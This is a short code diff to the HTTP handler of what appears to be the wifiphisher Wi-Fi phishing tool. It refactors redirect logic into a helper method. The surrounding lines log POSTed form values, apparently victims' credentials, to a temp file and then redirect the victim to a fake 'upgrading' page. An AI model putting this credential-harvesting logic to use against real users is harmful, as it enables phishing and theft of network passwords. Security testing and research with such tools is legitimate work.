@@ -202,6 +202,11 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
     """
     Request handler for the HTTP server that logs POST requests.
     """
+    def redirect(self, page="/"):
+        self.send_response(301)
+        self.send_header('Location', page)
+        self.end_headers()
+
     def do_QUIT(self):
         """
         Sends a 200 OK response, and sets server.stop to True
@@ -247,9 +252,7 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
                      })
         for item in form.list:
             if item.name and item.value and POST_VALUE_PREFIX in item.name:
-                self.send_response(301)
-                self.send_header('Location', '/upgrading.html')
-                self.end_headers()
+                self.redirect("/upgrading.html")
                 wifi_webserver_tmp = "/tmp/wifiphisher-webserver.tmp"
                 with open(wifi_webserver_tmp, "a+") as log_file:
                     log_file.write('[' + T + '*' + W + '] ' + O + "POST " +
@@ -258,7 +261,8 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
                                    W + "\n"
                                    )
                     log_file.close()
-                return
+                return       
+        self.redirect()
 
     def log_message(self, format, *args):
         return
